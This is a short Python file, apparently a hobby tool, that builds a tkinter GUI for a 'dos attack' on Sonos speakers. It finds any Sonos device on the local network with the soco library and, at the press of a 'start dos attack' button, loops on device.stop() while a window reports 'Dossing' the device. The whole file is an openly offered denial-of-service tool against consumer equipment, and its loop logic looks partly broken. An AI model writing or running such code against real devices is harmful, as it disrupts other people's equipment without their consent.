
# File for GUI version code.

from tkinter import *
import soco
root = Tk()
root.title("Dos sonos GUI")
root.geometry("400x200")
root.configure(bg="dark grey")
device = soco.discovery.any_soco()

def screen_dos_notify():
    while 1:
        print("Currently dossing device: " + str(device) + " :")
        device.stop()
        while 1:
            sc2 = Tk()
            sc2.title("Dossing Sonos Device" + str(device))
            sc2.geometry("60x200")
            sc2.resizable(height=False, width=True)

            label_dos = Label(sc2, text="Dossing " +  str(device) + " :").pack()
            
            sc2.mainloop()

def start_dos():
    if device == None:
        print("No device found on network")
        print("Exiting test. .")
        exit()
    else:
        screen_dos_notify()
    if len(str(device)) == 0:
        print("Check if the device is up and running on the network")

label_space = Label(root, text="\n", bg="dark grey").pack()
button_start = Button(root, text="start dos attack", height=2, width=20, borderwidth=0, command=start_dos).pack(pady=4)

button_exit = Button(root, text="EXIT ", height=2, width=20, borderwidth=0, command=exit).pack()

root.mainloop()